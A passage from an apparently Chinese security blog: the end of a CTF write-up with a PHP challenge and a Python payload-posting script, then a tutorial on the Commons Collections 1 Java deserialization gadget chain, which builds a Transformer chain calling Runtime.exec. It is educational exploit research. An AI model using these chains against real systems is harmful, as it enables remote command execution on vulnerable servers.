class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$cursor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkRef</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>)&gt;<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Refenerce size too long!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$r</span>[<span class="number">0</span>]) || <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$r</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkByte</span>(<span class="params"><span class="variable">$check</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_5</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_2</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_3</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;= <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_4</span></span><br><span class="line">            &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) !== <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_6</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://memory&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNeaten</span>();</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">main</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>一波代码审计，没时间看，以后补充</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2023-03-27 22:45:25</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2023-03-28 11:04:15</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;题目地址&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&quot;data&quot;</span>:<span class="string">&quot;A&quot;</span>*<span class="number">50</span>+<span class="string">&quot;flag&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">19</span>+<span class="string">&quot;B&quot;</span>*<span class="number">32</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">20</span>+<span class="string">&quot;system&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">18</span>+<span class="string">&quot;calc&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>CTFWP</category>
      </categories>
  </entry>
  <entry>
    <title>CC1</title>
    <url>/2023/03/15/CC1/</url>
    <content><![CDATA[<h1 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h1><p>Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合工具类。</p>
<p> <strong>Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer</strong></p>
<p>好的，现在让我们聚焦到Commons Collections内部，看看前辈们是如何利用它来让应用『产生』问题的。</p>
<p>我们先预备一个基本知识，在Java中，若想通过其原生JDK提供的接口执行系统命令，最常见的语句如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure>

<p>很简单，一个单例模式的方法获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令。在表达式注入类RCE漏洞中也可以频繁看到利用各种条件特性来构造这段语句的身影，比如Struts2的OGNL：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(cmd)</span><br></pre></td></tr></table></figure>

<p>比如Spring的SpEL：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>

<p>这里替小白问个基础但又和接下来的内容有关的问题：为什么都要使用链式结构？</p>
<p>原因其实很简单，因为无论是表达式解析执行还是反序列化时，底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的。你也可以换个方式问自己，如果你第一次请求<code>Runtime.getRuntime()</code>，那如何保证第二次请求<code>rt.exec()</code>能够拿到第一次的<code>Runtime</code>对象呢？</p>
<p>了解了这个问题之后，我们就可以开始尝试用Commons Collections先来构造这个链式结构了。</p>
<p>前辈们为我们在Commons Collections中找到了一个用于对象之间转换的<code>Transformer</code>接口，它有几个我们用得着的实现类：</p>
<ol>
<li><p><code>ConstantTransformer</code></p>
<p>ConstantTransformer，调用该类的transform方法返回传入对象本身。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>InvokerTransformer</code></p>
<p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    </span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>ChainedTransformer</code></p>
<p>它的transform方法能调用链中所有的transform方法，并且将前一个transform的输出作为当前transform的输入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>在开始之前先写一个简单的例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trans);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      chain.transform(<span class="string">&quot;test&quot;</span>); <span class="comment">//设置断点，进行调试</span></span><br></pre></td></tr></table></figure>

<p>其中，数组的中间两个元素是最让人费解的，我们一句一句来解释 <em>（前方高能预警，请对照上面几个<code>Transformer</code>的逻辑仔细看，接下来的内容网上有些解释是存在出入的）</em> ：</p>
<ol>
<li>构造一个<code>ConstantTransformer</code>，把<code>Runtime</code>的<code>Class</code>对象传进去，在<code>transform()</code>时，始终会返回这个对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>getMethod</code>，参数为<code>getRuntime</code>，在<code>transform()</code>时，传入1的结果，此时的<code>input</code>应该是<code>java.lang.Runtime</code>，但经过<code>getClass()</code>之后，<code>cls</code>为<code>java.lang.Class</code>，之后<code>getMethod()</code>只能获取<code>java.lang.Class</code>的方法，因此才会定义的待调用方法名为<code>getMethod</code>，然后其参数才是<code>getRuntime</code>，它得到的是<code>getMethod</code>这个方法的<code>Method</code>对象，<code>invoke()</code>调用这个方法，最终得到的才是<code>getRuntime</code>这个方法的<code>Method</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>invoke</code>，参数为空，在<code>transform()</code>时，传入2的结果，同理，<code>cls</code>将会是<code>java.lang.reflect.Method</code>，再获取并调用它的<code>invoke</code>方法，实际上是调用上面的<code>getRuntime()</code>拿到<code>Runtime</code>对象</li>
<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>exec</code>，参数为命令字符串，在<code>transform()</code>时，传入3的结果，获取<code>java.lang.Runtime</code>的<code>exec</code>方法并传参调用</li>
<li>最后把它们组装成一个数组全部放进<code>ChainedTransformer</code>中，在<code>transform()</code>时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求</li>
</ol>
<h1 id="从触发点开始分析"><a href="#从触发点开始分析" class="headerlink" title="从触发点开始分析"></a>从触发点开始分析</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">chain.transform(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01."></a>0x01.</h2><p>由于chain是new ChainedTransformer(trans);</p>
<p>所以进入ChainedTransformer，它的transform方法能调用链中所有的transform方法，并且将前一个transform的输出作为当前transform的输入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时iTransformers是transform[]</p>
<p>然后对transform[] 进行一个遍历 从我们自己输入的顺序开始</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">0</span>] ==ConstantTransformer</span><br></pre></td></tr></table></figure>

<p>进入ConstantTransformer方法，调用该类的transform方法返回传入对象本身。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>由于我们传入第一个的class是Runtime.class，所以iConstant&#x3D;&#x3D;Runtime.class &#x3D;&#x3D; object 一个类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">1</span>] ==InvokerTransformer</span><br></pre></td></tr></table></figure>

<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02."></a>0x02.</h2><p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p>
<p>我们传入的第二个class </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line">iMethodName =<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">iParamTypes = Class[]&#123;String.class, Class[].class&#125;;</span><br><span class="line">iArgs = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">   <span class="comment">// input:&quot;class java.lang.Runtime&quot; </span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); </span><br><span class="line">   <span class="comment">// 通过对第一个的分析此时的  cls== &quot;java.lang.Class&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); </span><br><span class="line">    <span class="comment">//Method method = cls.getMethod(&quot;getMethod&quot;, Class[]&#123;String.class, Class[].class&#125;); </span></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs); </span><br><span class="line">    <span class="comment">//invoke(Object obj, Object... args) 是method 类中的方法，这个方法是一个native 方法</span></span><br><span class="line">    <span class="comment">//input:&quot;class java.lang.Runtime &quot; </span></span><br><span class="line">    <span class="comment">//iArgs = new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;);</span></span><br><span class="line">    <span class="comment">//method &quot;java.lang.Class.getMethod(java.lang.String,java.lang.Class[])&quot;</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>此时object&#x3D;&#x3D;  java.lang.Runtime.getRuntime()方法的Methed对象</strong></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03."></a>0x03.</h2><p>继续进入InvokerTransformer</p>
<p>我们传入的第三个class </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">2</span>] ==InvokerTransformer</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line">iMethodName =<span class="string">&quot;invoke&quot;</span></span><br><span class="line">iParamTypes = Class[]&#123;String.class, Class[].class&#125;;</span><br><span class="line">iArgs = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;null&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br></pre></td></tr></table></figure>

<p>经过如下变换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">input:<span class="string">&quot;class java.lang.Runtime.getRuntime()方法的Methed对象&quot;</span></span><br><span class="line">cls==<span class="keyword">class</span> <span class="title class_">java</span>.lang.reflect.Method</span><br><span class="line">method ==java.lang.reflect.Method.invoke(java.lang.Object,java.lang.Object[])</span><br><span class="line">Object==Runtime <span class="comment">//一个实例化对象</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04."></a>0x04.</h2><p><strong>end</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">3</span>] ==InvokerTransformer</span><br><span class="line">input==Runtime 对象</span><br><span class="line">method==<span class="keyword">public</span> java.lang.Process java.lang.Runtime.exec(java.lang.String)</span><br><span class="line">iArgs == <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">最后执行Runtime.exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">反射获取 runtime实例,并执行代码</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">InvokerTransformer方法获取runtime实例，并执行代码</span><br><span class="line"><span class="type">Method</span>  <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>既然第2、3步这么绕，我们又知道了为什么，是不是可以考虑用下面这种逻辑更清晰的方式来构造呢：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;      </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),  </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]),      </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure>

<p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于<code>Runtime.getRuntime()</code>得到的是一个对象，这个对象也需要参与序列化过程，而<code>Runtime</code>本身是没有实现<code>Serializable</code>接口的，所以会导致序列化失败。</p>
<p>也有同学可能看过ysoserial构造的Payload，它的习惯是先定义一个包含『无效』<code>Transformer</code>的<code>ChainedTransformer</code>，等所有对象装填完毕之后再利用反射将实际的数组放进去。</p>
<h1 id="谁调用了InvokerTransformer-类中的-transform-方法"><a href="#谁调用了InvokerTransformer-类中的-transform-方法" class="headerlink" title="谁调用了InvokerTransformer 类中的 transform 方法"></a>谁调用了InvokerTransformer 类中的 transform 方法</h1><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>我们下一步就需要向上一层寻找谁调用了InvokerTransformer 类中的 transform 方法</p>
<p>选中transform，右键 Find Usages 查看调用，寻找不同名字调用的 transform 方法，如果是transform 再调用 transform 是没有意义的，我们最后的目标是要回到 readObject 中。</p>
<img src="/2023/03/15/CC1/image-20230316164716110.png" class="" title="image-20230316164716110">

<p>最终是可以发现TransformedMap类中可以入手的</p>
<p>触发点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformedMap的构造方法是</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为构造方法是protected 不能直接调用，所以找decorate</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>对checkSetValue,右键 Find Usages 查看调用，只有一处调用，是 AbstractInputCheckedMapDecorator</p>
<img src="/2023/03/15/CC1/image-20230316170700841.png" class="" title="image-20230316170700841">



<img src="/2023/03/15/CC1/image-20230316172127908.png" class="" title="image-20230316172127908">

<p>而且我们可以发现 AbstractInputCheckedMapDecorator 是 TransformedMap的父类。</p>
<p>里面有方法setValue调用checkSetValue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">         value = parent.checkSetValue(value);  <span class="comment">//触发checkSetValue</span></span><br><span class="line">         <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>AbstractInputCheckedMapDecorator 构造</p>
